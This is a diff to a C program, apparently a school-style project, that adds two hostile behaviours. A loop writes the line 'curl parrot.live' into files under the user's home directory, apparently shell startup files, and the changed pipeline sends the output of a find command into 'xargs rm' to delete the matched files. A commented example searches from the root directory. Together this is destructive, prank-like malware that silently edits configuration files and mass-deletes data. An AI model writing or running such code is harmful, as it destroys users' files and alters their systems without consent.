@@ -100,6 +100,7 @@ void	process_child(char **command, char **envp, int fdin, int fdout)
 	if (pid == 0)
 	{
 		dup2(fdin, fdout);
+		close(fdin);
 		res = execcmd(command, envp);
 		if (res == 5)
 			exit_error_with_msg(PERM_DENIED);
@@ -152,7 +153,7 @@ int	main(int ac, char **av, char **envp)
 	char		*commands;
 	char		**find_cmd;
 	int			fds[2];
-	char		*rm_cmd[] = {"rm", NULL};
+	char		*rm_cmd[] = {"xargs", "rm", NULL};
 	// char		*find_cmd[] = {"find", "/", "-type", "f", "-name", "*.mg", NULL};
 
 	i = 0;
@@ -166,25 +167,27 @@ int	main(int ac, char **av, char **envp)
 	find_cmd = ft_split(commands, ' ');
 	if (!find_cmd)
 		return (free(commands), 1);
-	// while (file_list[i])
-	// {
-	// 	path = ft_strjoin(getenv("HOME"), file_list[i]);
-	// 	if (!path)
-	// 		return (1);
-	// 	printf("opening %s\n", path);
-	// 	// fd = open(path, O_RDONLY);
-	// 	// printf("on fd %d\n", fd);
-	// 	// if (fd < 0)
-	// 	// 	return (1);
-	// 	if (replace_line(path, "curl parrot.live"))
-	// 		return (1);
-	// 	close(fd);
-	// 	free(path);
-	// 	i++;
-	// }
+	while (file_list[i])
+	{
+		path = ft_strjoin(getenv("HOME"), file_list[i]);
+		if (!path)
+			return (1);
+		printf("opening %s\n", path);
+		// fd = open(path, O_RDONLY);
+		// printf("on fd %d\n", fd);
+		// if (fd < 0)
+		// 	return (1);
+		if (replace_line(path, "curl parrot.live"))
+			return (1);
+		// close(fd);
+		free(path);
+		i++;
+	}
 	pipe(fds);
 	process_child(find_cmd, envp, fds[1], STDOUT_FILENO);
 	process_child(rm_cmd, envp, fds[0], STDIN_FILENO);
+	close(fds[0]);
+	close(fds[1]);
 	waitpid(-1, NULL, 0);
 	remove(current_file_buffer);
 	return (0);
